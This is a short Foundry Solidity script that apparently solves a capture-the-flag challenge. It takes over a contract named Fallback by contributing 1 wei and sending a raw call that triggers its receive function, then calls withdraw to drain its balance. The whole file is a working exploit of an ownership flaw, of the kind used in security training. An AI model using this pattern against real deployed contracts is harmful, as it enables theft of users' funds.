// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";
import {Fallback} from "../src/Fallback.sol";

contract CounterScript is Script {
    Fallback public code = Fallback(payable(0xA4D80139fa601C312679Ad2bEc1fFb14fb0DBE0f));

    function run() external {
        vm.startBroadcast(vm.envUint("PRIV"));
        code.contribute{value: 1}();
        (bool ok,) = address(code).call{value: 1}("");
        require(ok);
        code.withdraw();
        vm.stopBroadcast();
    }
}
